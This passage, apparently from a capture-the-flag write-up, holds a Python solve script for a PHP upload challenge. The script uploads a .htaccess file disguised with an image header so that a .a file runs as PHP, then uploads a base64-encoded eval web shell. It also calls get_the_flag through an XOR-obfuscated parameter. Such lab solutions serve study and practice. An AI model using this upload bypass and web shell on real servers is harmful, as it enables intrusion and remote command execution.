&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;r&#34;http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&amp;#123;%80%80%80%80^%df%c7%c5%d4&amp;#125;&amp;#123;%80&amp;#125;();&amp;amp;%80=get_the_flag&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;session &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;session&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;htaccess_content &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#define width 1337&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#define height 1337&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;AddType application/x-httpd-php .a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=./shell.a&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;files_htaccess &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#39;.htaccess&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; htaccess_content&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;image/jpeg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;res_hta &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; files&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;files_htaccess&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res_hta&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shell_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;files_shell &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#39;shell.a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; shell_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;image/jpeg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;res_jpg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; files&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;files_shell&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res_jpg&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;3-1open_basedir-bypass&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-1open_basedir-bypass&#34;&gt;#&lt;/a&gt; 3-1.open_basedir bypass&lt;/h3&gt;
